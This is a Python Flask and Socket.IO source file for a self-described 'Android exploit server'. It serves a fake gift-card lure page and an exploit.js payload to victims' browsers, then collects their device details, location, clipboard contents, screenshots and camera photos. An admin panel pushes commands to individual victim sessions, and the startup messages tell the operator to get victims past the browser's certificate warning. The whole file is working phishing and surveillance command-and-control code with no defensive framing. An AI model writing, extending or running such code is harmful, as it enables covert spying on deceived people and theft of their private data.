"""
üîí HTTPS SERVER with Self-Signed Certificate
Enables camera access on local network!
"""

from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room
import os
import json
from datetime import datetime
import base64
import ssl

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key_change_this'
socketio = SocketIO(app, cors_allowed_origins="*")

# Storage for sessions and captured data
connected_sessions = {}
captured_data = {
    'device_info': [],
    'locations': [],
    'screenshots': [],
    'clipboard': [],
    'camera_photos': []
}

@app.route('/')
def landing_page():
    """Fake gift card landing page (victim sees this)"""
    return render_template('landing.html')

@app.route('/admin')
def admin_panel():
    """Your control panel (secret admin page)"""
    return render_template('admin.html')

@app.route('/test')
def test_page():
    """Test page for debugging commands"""
    return render_template('test.html')

@app.route('/vibrate-test')
def vibrate_test():
    """Dedicated vibration diagnostic page"""
    return render_template('vibrate_test.html')

@app.route('/exploit.js')
def exploit_script():
    """JavaScript payload that runs on victim's browser"""
    return render_template('exploit.js'), 200, {'Content-Type': 'application/javascript'}

@socketio.on('connect')
def handle_connect():
    """New victim connected"""
    session_id = request.sid
    
    # Join room for targeted messaging
    join_room(session_id)
    
    # Get victim info
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    connected_sessions[session_id] = {
        'ip': ip,
        'user_agent': user_agent,
        'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'active': True
    }
    
    print(f"[+] New connection from: {ip}")
    print(f"    User Agent: {user_agent}")
    print(f"    Session: {session_id}")
    print(f"    Joined room: {session_id}")
    
    # Notify admin panel
    emit('victim_connected', {
        'session_id': session_id,
        'ip': ip,
        'user_agent': user_agent,
        'time': connected_sessions[session_id]['connected_at']
    }, broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    """Victim disconnected"""
    session_id = request.sid
    leave_room(session_id)
    if session_id in connected_sessions:
        connected_sessions[session_id]['active'] = False
        print(f"[-] Disconnected: {connected_sessions[session_id]['ip']}")

@socketio.on('victim_data')
def handle_victim_data(data):
    """Receive data from victim"""
    session_id = request.sid
    data_type = data.get('type')
    
    print(f"[*] Received {data_type} from {session_id}")
    
    # Store data
    if data_type == 'device_info':
        captured_data['device_info'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
    
    elif data_type == 'location':
        captured_data['locations'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
    
    elif data_type == 'screenshot':
        captured_data['screenshots'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
    
    elif data_type == 'clipboard':
        captured_data['clipboard'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
    
    elif data_type == 'camera_photo':
        captured_data['camera_photos'].append({
            'session': session_id,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data.get('data')
        })
        print(f"[üì∑] Camera photo captured from {session_id}!")
    
    # Send to admin panel
    emit('data_received', {
        'session': session_id,
        'type': data_type,
        'data': data.get('data'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }, broadcast=True)

@socketio.on('admin_command')
def handle_admin_command(data):
    """Send command to victim from admin panel"""
    target_session = data.get('session')
    command = data.get('command')
    params = data.get('params', {})
    
    print(f"[>] Sending command '{command}' to {target_session}")
    print(f"    Parameters: {params}")
    
    # Send command to specific victim's room
    emit('execute_command', {
        'command': command,
        'params': params
    }, room=target_session)
    
    print(f"[‚úì] Command sent to room {target_session}")

@app.route('/api/sessions')
def get_sessions():
    """Get list of connected sessions"""
    return jsonify({
        'sessions': [
            {
                'id': sid,
                'ip': info['ip'],
                'user_agent': info['user_agent'],
                'connected_at': info['connected_at'],
                'active': info['active']
            }
            for sid, info in connected_sessions.items()
        ],
        'count': len(connected_sessions)
    })

@app.route('/api/data')
def get_captured_data():
    """Get all captured data"""
    return jsonify(captured_data)

if __name__ == '__main__':
    print("\n" + "="*60)
    print("üîí HTTPS WEB-BASED ANDROID EXPLOIT SERVER üîí")
    print("   Camera Access Enabled on Local Network")
    print("="*60)
    print("\n[*] Starting HTTPS server...")
    print("[*] Victim link: https://192.168.100.59:5000")
    print("[*] Admin panel: https://localhost:5000/admin")
    print("[*] Test page: https://192.168.100.59:5000/test")
    print("\n‚ö†Ô∏è  IMPORTANT:")
    print("    1. Browser will show 'Not Secure' warning")
    print("    2. Click 'Advanced' ‚Üí 'Proceed Anyway'")
    print("    3. This enables camera access over local network!")
    print("    4. Self-signed certificate = normal for local testing")
    print("\n[*] Generating self-signed certificate...")
    
    # Create adhoc SSL certificate (Flask will generate it)
    print("[‚úì] Using Flask's adhoc SSL certificate")
    print("\n[‚úì] HTTPS server starting...")
    print("[‚úì] Camera access will work!")
    print("\n")
    
    # Use adhoc SSL (Flask generates temporary certificate)
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, ssl_context='adhoc')
